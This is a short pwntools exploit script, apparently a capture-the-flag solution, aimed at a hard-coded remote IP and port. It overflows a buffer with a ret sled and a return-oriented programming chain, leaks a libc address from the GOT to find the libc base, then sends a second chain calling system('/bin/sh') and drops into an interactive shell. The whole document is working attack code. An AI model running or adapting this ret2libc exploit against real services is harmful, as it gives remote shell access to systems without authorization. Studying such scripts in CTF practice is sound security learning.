from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal=['tmux','split','-h']
p=remote("124.222.118.53",1027)
#p=process('./pwn')
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 		= lambda a,b: p.sendafter(a,b)
ra 		= lambda a: p.readuntil(a)
s		= lambda a: p.send(a)
sl		= lambda a: p.sendline(a)
rdi = 0x0000000000400633
rsi = 0x0000000000400631
got= 0x601018
write = 0x400430
libc = ELF("./libc-2.23.so")
#gdb.attach(p,'b * 0x4005cd')
pay = flat([rdi,got,write,0x4005ab])
s(p64(0x0000000000400419)*(0x20-len(pay)//8)+pay)
p.readline()
base = u64(p.readline()[:-1]+'\0\0') - libc.sym['puts']
log.warning(hex(base))
libc.address =base
pay = flat([rdi,libc.search("/bin/sh").next(),libc.sym['system']])
s(p64(0x0000000000400419)*(0x20-len(pay)//8)+pay)
p.interactive()
